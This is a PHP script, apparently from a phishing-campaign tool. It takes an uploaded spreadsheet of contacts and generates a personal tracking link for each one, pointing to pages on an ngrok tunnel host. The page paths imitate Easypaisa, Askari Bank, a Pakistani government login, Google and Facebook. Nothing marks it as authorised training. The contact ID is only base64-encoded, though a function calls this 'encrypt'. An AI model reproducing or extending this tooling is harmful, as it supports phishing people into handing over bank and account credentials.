<?php
session_start();
include '../includes/db.php';
require '../vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\IOFactory;

if (!isset($_SESSION['group_id'])) {
    header("Location: dashboard.php");
    exit();
}

$group_id = $_SESSION['group_id'];

$tracking_urls = [
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
    "https://8671-103-137-24-144.ngrok-free.app/google/googlei.php",
    "https://8671-103-137-24-144.ngrok-free.app/real-Estate-Management-System-main/",
    "https://8671-103-137-24-144.ngrok-free.app/facebook/facebook_login.php",
    "https://8671-103-137-24-144.ngrok-free.app/warZoneCommand/index.php",
    "https://8671-103-137-24-144.ngrok-free.app/hackathon/index.html#about",
    "https://8671-103-137-24-144.ngrok-free.app/eshop2",
    "https://8671-103-137-24-144.ngrok-free.app/stylo_website/welcome_stylo.php"
];

function encrypt_data($data) {
    return base64_encode($data);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['excel_file'])) {
    $spreadsheet = IOFactory::load($_FILES['excel_file']['tmp_name']);
    $sheet = $spreadsheet->getActiveSheet();
    $data = $sheet->toArray();

    foreach ($data as $row) {
        $contact = trim($row[0]);
        if (!empty($contact)) {
            foreach ($tracking_urls as $url) {
                $encrypted_contact = encrypt_data($contact);
                $tracking_link = $url . "?id=" . urlencode($encrypted_contact);

                $stmt = $conn->prepare("INSERT INTO tracking_links (group_id, contact, tracking_link) VALUES (?, ?, ?)");
                $stmt->execute([$group_id, $contact, $tracking_link]);
            }
        }
    }
    echo "<div class='alert alert-success'>Tracking links generated successfully.</div>";
}
?>
